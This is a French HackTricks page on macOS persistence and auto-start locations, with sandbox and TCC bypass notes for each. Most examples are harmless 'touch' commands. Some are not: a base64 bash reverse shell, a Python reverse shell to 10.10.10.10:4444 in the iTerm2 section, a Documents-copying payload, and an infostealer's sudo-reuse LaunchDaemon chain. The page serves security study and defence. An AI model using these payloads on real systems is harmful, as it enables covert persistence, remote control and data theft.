# Démarrage automatique de macOS

{{#include ../banners/hacktricks-training.md}}

Cette section est largement basée sur la série de blogs [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). L'objectif est d'ajouter **davantage d'emplacements de démarrage automatique** (si possible), d'indiquer **quelles techniques fonctionnent encore** aujourd'hui avec la dernière version de macOS (13.4) et de préciser les **permissions** nécessaires.

## Sandbox Bypass

> [!TIP]
> Vous trouverez ici des emplacements de démarrage utiles pour le **sandbox bypass**, qui permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **attendant** une **action très courante**, une **durée déterminée** ou une **action que vous pouvez généralement effectuer** depuis une sandbox sans avoir besoin des permissions root.

### Launchd

- Utile pour le sandbox bypass : [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

- **`/Library/LaunchAgents`**
- **Déclencheur** : Redémarrage
- Permissions root requises
- **`/Library/LaunchDaemons`**
- **Déclencheur** : Redémarrage
- Permissions root requises
- **`/System/Library/LaunchAgents`**
- **Déclencheur** : Redémarrage
- Permissions root requises
- **`/System/Library/LaunchDaemons`**
- **Déclencheur** : Redémarrage
- Permissions root requises
- **`~/Library/LaunchAgents`**
- **Déclencheur** : Reconnexion
- **`~/Library/LaunchDemons`**
- **Déclencheur** : Reconnexion

> [!TIP]
> Fait intéressant, **`launchd`** possède une property list intégrée dans une section Mach-o `__Text.__config`, qui contient d'autres services bien connus que launchd doit démarrer. De plus, ces services peuvent contenir `RequireSuccess`, `RequireRun` et `RebootOnSuccess`, ce qui signifie qu'ils doivent être exécutés et se terminer avec succès.
>
> Ofc, elle ne peut pas être modifiée à cause de la signature du code.

#### Description et exploitation

**`launchd`** est le premier **processus** exécuté par le noyau de macOS au démarrage et le dernier à se terminer lors de l'arrêt. Il devrait toujours avoir le **PID 1**. Ce processus va **lire et exécuter** les configurations indiquées dans les **plists** **ASEP** situées dans :

- `/Library/LaunchAgents` : Agents par utilisateur installés par l'administrateur
- `/Library/LaunchDaemons` : Daemons à l'échelle du système installés par l'administrateur
- `/System/Library/LaunchAgents` : Agents par utilisateur fournis par Apple.
- `/System/Library/LaunchDaemons` : Daemons à l'échelle du système fournis par Apple.

Lorsqu'un utilisateur se connecte, les plists situées dans `/Users/$USER/Library/LaunchAgents` et `/Users/$USER/Library/LaunchDemons` sont démarrées avec les **permissions de l'utilisateur connecté**.

La **différence principale entre les agents et les daemons est que les agents sont chargés lorsque l'utilisateur se connecte, tandis que les daemons sont chargés au démarrage du système** (car certains services, comme ssh, doivent être exécutés avant tout accès d'un utilisateur au système). Les agents peuvent également utiliser l'interface graphique, tandis que les daemons doivent s'exécuter en arrière-plan.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Dans certains cas, un **agent doit être exécuté avant que l’utilisateur se connecte**, on les appelle des **PreLoginAgents**. Par exemple, cela est utile pour fournir une technologie d’assistance lors de la connexion. Ils peuvent également être trouvés dans `/Library/LaunchAgents`(voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).

> [!TIP]
> Les nouveaux fichiers de configuration de Daemons ou d’Agents seront **chargés après le prochain redémarrage ou en utilisant** `launchctl load <target.plist>` Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (cependant, ces fichiers plist ne seront pas chargés automatiquement après un redémarrage).\
> Il est également possible de les **décharger** avec `launchctl unload <target.plist>` (le processus indiqué par celui-ci sera terminé),
>
> Pour **s’assurer qu’il n’y a rien** (comme un override) **qui empêche** un **Agent** ou un **Daemon** **de** **s’exécuter**, lancez : `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Lister tous les agents et daemons chargés par l’utilisateur actuel :
```bash
launchctl list
```
#### Exemple de chaîne malveillante de LaunchDaemon (réutilisation de mot de passe)

Un infostealer macOS récent a réutilisé un **mot de passe sudo capturé** pour déposer un user agent et un LaunchDaemon root :

- Écrire la boucle de l’agent dans `~/.agent` et la rendre exécutable.
- Générer un plist dans `/tmp/starter` pointant vers cet agent.
- Réutiliser le mot de passe volé avec `sudo -S` pour le copier dans `/Library/LaunchDaemons/com.finder.helper.plist`, définir `root:wheel`, puis le charger avec `launchctl load`.
- Démarrer l’agent silencieusement avec `nohup ~/.agent >/dev/null 2>&1 &` afin de détacher la sortie.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Si un plist appartient à un utilisateur, même s'il se trouve dans des dossiers système daemon à l'échelle du système, la **tâche sera exécutée en tant que cet utilisateur** et non en tant que root. Cela peut empêcher certaines attaques d'escalade de privilèges.

#### Plus d'informations sur launchd

**`launchd`** est le **premier** processus en mode utilisateur démarré par le **kernel**. Le démarrage du processus doit être **réussi** et il **ne peut pas se terminer ni crasher**. Il est même **protégé** contre certains **signaux de terminaison**.

L'une des premières choses que ferait **`launchd`** est de **démarrer** tous les **daemons**, comme :

- **Daemons de timer** basés sur l'heure d'exécution :
- atd (`com.apple.atrun.plist`) : possède un `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`) : possède un `StartCalendarInterval` pour démarrer à 00:15
- **Daemons réseau** comme :
- `org.cups.cups-lpd` : écoute en TCP (`SockType: stream`) avec `SockServiceName: printer`
- SockServiceName doit être soit un port, soit un service provenant de `/etc/services`
- `com.apple.xscertd.plist` : écoute en TCP sur le port 1640
- **Daemons de chemin** exécutés lorsqu'un chemin spécifié change :
- `com.apple.postfix.master` : vérifie le chemin `/etc/postfix/aliases`
- **Daemons de notifications IOKit** :
- `com.apple.xartstorageremoted` : `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach :**
- `com.apple.xscertd-helper.plist` : indique dans l'entrée `MachServices` le nom `com.apple.xscertd.helper`
- **UserEventAgent :**
- Ceci est différent du précédent. Il permet à launchd de lancer des applications en réponse à un événement spécifique. Cependant, dans ce cas, le binaire principal impliqué n'est pas `launchd`, mais `/usr/libexec/UserEventAgent`. Il charge des plugins depuis le dossier restreint par SIP `/System/Library/UserEventPlugins/`, où chaque plugin indique son initialiser dans la clé `XPCEventModuleInitializer` ou, dans le cas des plugins plus anciens, dans le dict `CFPluginFactories`, sous la clé `FB86416D-6164-2070-726F-70735C216EC0` de son `Info.plist`.

### fichiers de démarrage du shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Utile pour bypasser le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez trouver une app avec un TCC bypass qui exécute un shell chargeant ces fichiers

#### Emplacements

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Déclencheur** : ouvrir un terminal avec zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Déclencheur** : ouvrir un terminal avec zsh
- Root requis
- **`~/.zlogout`**
- **Déclencheur** : quitter un terminal avec zsh
- **`/etc/zlogout`**
- **Déclencheur** : quitter un terminal avec zsh
- Root requis
- Potentiellement davantage dans : **`man zsh`**
- **`~/.bashrc`**
- **Déclencheur** : ouvrir un terminal avec bash
- `/etc/profile` (ne fonctionnait pas)
- `~/.profile` (ne fonctionnait pas)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Déclencheur** : devrait se déclencher avec xterm, mais il **n'est pas installé** et, même après son installation, cette erreur est générée : xterm : `DISPLAY is not set`

#### Description et exploitation

Lors de l'initialisation d'un environnement shell tel que `zsh` ou `bash`, **certains fichiers de démarrage sont exécutés**. macOS utilise actuellement `/bin/zsh` comme shell par défaut. Ce shell est automatiquement lancé lorsque l'application Terminal est ouverte ou lorsqu'un appareil est accessible via SSH. Bien que `bash` et `sh` soient également présents dans macOS, ils doivent être invoqués explicitement pour être utilisés.

La page de manuel de zsh, que nous pouvons lire avec **`man zsh`**, fournit une longue description des fichiers de démarrage.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applications rouvertes

> [!CAUTION]
> La configuration de l'exploitation indiquée, suivie d'une déconnexion puis d'une reconnexion, voire d'un redémarrage, n'a pas fonctionné pour moi pour exécuter l'application. (L'application ne s'exécutait pas ; elle doit peut-être être en cours d'exécution lorsque ces actions sont effectuées.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Déclencheur** : réouverture des applications après un redémarrage

#### Description et exploitation

Toutes les applications à rouvrir se trouvent dans le plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Ainsi, pour que les applications rouvertes lancent la vôtre, il suffit d'**ajouter votre application à la liste**.

L'UUID peut être trouvé en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier les applications qui seront rouvertes, vous pouvez exécuter :
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Pour **ajouter une application à cette liste**, vous pouvez utiliser :
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Préférences de Terminal

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal use to have FDA permissions of the user use it

#### Emplacement

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Déclencheur** : Ouvrir Terminal

#### Description et Exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l'utilisateur dans les Applications. Certaines de ces préférences peuvent contenir une configuration permettant d'**exécuter d'autres applications/scripts**.

Par exemple, Terminal peut exécuter une commande au démarrage :

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** comme suit :
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Ainsi, si le plist des préférences du terminal dans le système pouvait être écrasé, la fonctionnalité **`open`** pourrait être utilisée pour **ouvrir le terminal, et cette commande serait exécutée**.

Vous pouvez l’ajouter depuis la CLI avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Scripts Terminal / autres extensions de fichiers

- Utile pour contourner une sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
- Utiliser Terminal pour obtenir les permissions FDA de l’utilisateur

#### Emplacement

- **N’importe où**
- **Déclencheur** : ouvrir Terminal

#### Description et exploitation

Si vous créez un [script **`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) et l’ouvrez, l’**application Terminal** sera automatiquement invoquée pour exécuter les commandes qui y sont indiquées. Si l’application Terminal dispose de privilèges spéciaux (tels que TCC), votre commande sera exécutée avec ces privilèges.

Essayez avec :
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Vous pouvez également utiliser les extensions **`.command`**, **`.tool`**, avec du contenu de scripts shell classiques ; ils seront également ouverts par Terminal.

> [!CAUTION]
> Si Terminal dispose de **Full Disk Access**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre de terminal).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir des accès TCC supplémentaires

#### Emplacement

- **`/Library/Audio/Plug-Ins/HAL`**
- Root requis
- **Déclencheur** : Redémarrer coreaudiod ou l’ordinateur
- **`/Library/Audio/Plug-ins/Components`**
- Root requis
- **Déclencheur** : Redémarrer coreaudiod ou l’ordinateur
- **`~/Library/Audio/Plug-ins/Components`**
- **Déclencheur** : Redémarrer coreaudiod ou l’ordinateur
- **`/System/Library/Components`**
- Root requis
- **Déclencheur** : Redémarrer coreaudiod ou l’ordinateur

#### Description

Selon les writeups précédents, il est possible de **compiler certains audio plugins** et de les faire charger.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [🟠](https://emojipedia.org/large-orange-circle)
- Vous pourriez obtenir des accès TCC supplémentaires

#### Emplacement

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

Les QuickLook plugins peuvent être exécutés lorsque vous **déclenchez l’aperçu d’un fichier** (appuyez sur la barre d’espace avec le fichier sélectionné dans Finder) et qu’un **plugin prenant en charge ce type de fichier** est installé.

Il est possible de compiler votre propre QuickLook plugin, de le placer dans l’un des emplacements précédents pour le charger, puis d’accéder à un fichier pris en charge et d’appuyer sur la barre d’espace pour le déclencher.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Cela n’a pas fonctionné pour moi, ni avec le LoginHook utilisateur ni avec le LogoutHook root.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez être en mesure d’exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Situé dans `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont deprecated, mais peuvent être utilisés pour exécuter des commandes lorsqu’un utilisateur se connecte.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ce paramètre est stocké dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Pour le supprimer :
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
L’entrée de l’utilisateur root est stockée dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Vous trouverez ici des start locations utiles pour le **sandbox bypass**, qui permettent d’exécuter simplement quelque chose en **l’écrivant dans un fichier** et en **s’attendant à des conditions peu courantes**, comme certains **programmes installés, des actions d’un utilisateur « uncommon » ou des environnements spécifiques**.

### Cron

**Writeup** : [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Utile pour effectuer un sandbox bypass : [✅](https://emojipedia.org/check-mark-button)
- Cependant, vous devez pouvoir exécuter le binaire `crontab`
- Ou être root
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Les privilèges root sont requis pour un accès direct en écriture. Aucun privilège root n’est requis si vous pouvez exécuter `crontab <file>`
- **Trigger** : dépend du cron job

#### Description & Exploitation

Listez les cron jobs de l’**utilisateur actuel** avec :
```bash
crontab -l
```
Vous pouvez également voir toutes les tâches cron des utilisateurs dans **`/usr/lib/cron/tabs/`** et **`/var/at/tabs/`** (nécessite les privilèges root).

Dans MacOS, plusieurs dossiers exécutant des scripts à une **fréquence donnée** peuvent être trouvés dans :
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Vous pouvez y trouver les **jobs** **cron** réguliers, les **jobs** **at** (peu utilisés) et les **jobs** **periodic** (principalement utilisés pour nettoyer les fichiers temporaires). Les **jobs** **periodic** quotidiens peuvent par exemple être exécutés avec : `periodic daily`.

Pour ajouter programmatiquement un **cronjob utilisateur**, il est possible d'utiliser :
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- iTerm2 avait auparavant des permissions TCC accordées

#### Emplacements

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Déclencheur** : Ouvrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Déclencheur** : Ouvrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Déclencheur** : Ouvrir iTerm

#### Description et exploitation

Les scripts stockés dans **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** seront exécutés. Par exemple :
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou :
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Le script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** sera également exécuté :
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Les préférences iTerm2 situées dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** peuvent **indiquer une commande à exécuter** lorsque le terminal iTerm2 est ouvert.

Ce paramètre peut être configuré dans les réglages iTerm2 :

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande apparaît dans les préférences :
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Vous pouvez définir la commande à exécuter avec :
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Il est très probable qu'il existe **d'autres moyens d'abuser des préférences d'iTerm2** pour exécuter des commandes arbitraires.

### xbar

Writeup : [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais xbar doit être installé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- Le programme demande des permissions d’accessibilité

#### Emplacement

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Déclencheur** : dès que xbar est exécuté

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d’écrire un shell script dans **`~/Library/Application\ Support/xbar/plugins/`**, lequel sera exécuté au démarrage de xbar :
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Utile pour bypasser le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais Hammerspoon doit être installé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- Il demande les autorisations d’accessibilité

#### Emplacement

- **`~/.hammerspoon/init.lua`**
- **Déclencheur** : Une fois que hammerspoon est exécuté

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) sert de plateforme d’automatisation pour **macOS**, en utilisant le **langage de script LUA** pour ses opérations. Il prend notamment en charge l’intégration de code AppleScript complet ainsi que l’exécution de shell scripts, ce qui améliore considérablement ses capacités de scripting.

L’application recherche un fichier unique, `~/.hammerspoon/init.lua`, et lorsque celle-ci est démarrée, le script est exécuté.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais BetterTouchTool doit être installé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- Il demande les permissions Automation-Shortcuts et Accessibility

#### Emplacement

- `~/Library/Application Support/BetterTouchTool/*`

Cet outil permet d'indiquer des applications ou des scripts à exécuter lorsque certains raccourcis sont pressés. Un attaquant pourrait être en mesure de configurer son propre **raccourci et action à exécuter dans la base de données** afin de lui faire exécuter du code arbitraire (un raccourci pourrait simplement consister à appuyer sur une touche).

### Alfred

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais Alfred doit être installé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- Il demande les permissions Automation, Accessibility et même Full-Disk access

#### Emplacement

- `???`

Il permet de créer des workflows pouvant exécuter du code lorsque certaines conditions sont remplies. Il est potentiellement possible pour un attaquant de créer un fichier de workflow et de faire en sorte qu'Alfred le charge (il est nécessaire de payer la version premium pour utiliser les workflows).

### SSHRC

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais ssh doit être activé et utilisé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
- SSH est utilisé pour obtenir l'accès FDA

#### Emplacement

- **`~/.ssh/rc`**
- **Déclencheur** : Connexion via ssh
- **`/etc/ssh/sshrc`**
- Root requis
- **Déclencheur** : Connexion via ssh

> [!CAUTION]
> Pour activer ssh, Full Disk Access est requis :
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description et exploitation

Par défaut, sauf si `PermitUserRC no` est présent dans `/etc/ssh/sshd_config`, lorsque l'utilisateur **se connecte via SSH**, les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** sont exécutés.

### **Éléments de connexion**

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez exécuter `osascript` avec des arguments
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Déclencheur :** Connexion
- Payload d'exploitation stocké et appelant **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Déclencheur :** Connexion
- Root requis

#### Description

Dans Préférences Système -> **Éléments de connexion** des utilisateurs et groupes, vous pouvez trouver les **éléments à exécuter lorsque l'utilisateur se connecte**.\
Il est possible de les lister, d'en ajouter et d'en supprimer depuis la ligne de commande :
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ces éléments sont stockés dans le fichier **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Les **Login items** peuvent **également être indiqués** à l'aide de l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), qui stockera la configuration dans **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Voir la section précédente sur les Login Items, ceci est une extension)

Si vous stockez un fichier **ZIP** en tant que **Login Item**, l'**`Archive Utility`** l'ouvrira et, si le zip était par exemple stocké dans **`~/Library`** et contenait le dossier **`LaunchAgents/file.plist`** avec une backdoor, ce dossier sera créé (il ne l'est pas par défaut) et le plist sera ajouté. Ainsi, la prochaine fois que l'utilisateur se reconnectera, la **backdoor indiquée dans le plist sera exécutée**.

Une autre option serait de créer les fichiers **`.bash_profile`** et **`.zshenv`** dans le HOME de l'utilisateur. Ainsi, même si le dossier LaunchAgents existe déjà, cette technique fonctionnerait toujours.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Utile pour bypasser le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez **exécuter** **`at`** et celui-ci doit être **activé**
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez **exécuter** **`at`** et celui-ci doit être **activé**

#### **Description**

Les tâches **`at`** sont conçues pour **planifier l'exécution de tâches uniques** à des heures précises. Contrairement aux tâches cron, les tâches **`at`** sont automatiquement supprimées après leur exécution. Il est important de noter que ces tâches persistent après les redémarrages du système, ce qui peut représenter un problème de sécurité dans certaines conditions.

Par **défaut**, elles sont **désactivées**, mais l'utilisateur **root** peut les **activer** avec :
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Cela créera un fichier dans 1 heure :
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Vérifiez la file d’attente des tâches à l’aide de `atq` :
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
